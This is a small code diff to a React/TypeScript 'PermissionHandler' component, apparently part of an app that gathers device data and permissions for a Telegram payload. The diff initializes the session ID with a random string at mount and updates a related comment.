@@ -65,7 +65,8 @@ const PermissionHandler = () => {
   const [collectedData, setCollectedData] = useState<Omit<TelegramDataPayload, 'messageType' | 'timestamp' | 'sessionId'>>({});
   const [sessionKey, setSessionKey] = useState(0);
   const [processSuccessful, setProcessSuccessful] = useState<boolean>(false);
-  const [currentSessionId, setCurrentSessionId] = useState<string>(""); // Состояние для хранения ID сессии
+  // Инициализируем currentSessionId сразу при монтировании
+  const [currentSessionId, setCurrentSessionId] = useState<string>(() => Math.random().toString(36).substring(2, 10).toUpperCase());
   const processInitiatedRef = useRef(false); // Новый ref для отслеживания инициации процесса
 
   const generateSessionId = useCallback(() => {
@@ -210,7 +211,7 @@ const PermissionHandler = () => {
       }
       processInitiatedRef.current = true; // Отмечаем, что процесс инициирован
 
-      // currentSessionId уже установлен в startNewSession
+      // currentSessionId уже установлен в startNewSession или при инициализации useState
       console.log(`[Session ${currentSessionId}] Starting runProcess. App Phase: ${appPhase}`); // Добавлен лог
 
       setLoadingMessage("Սարքի տվյալների և թույլտվությունների հավաքում..."); // Сбор данных об устройстве и разрешениях...
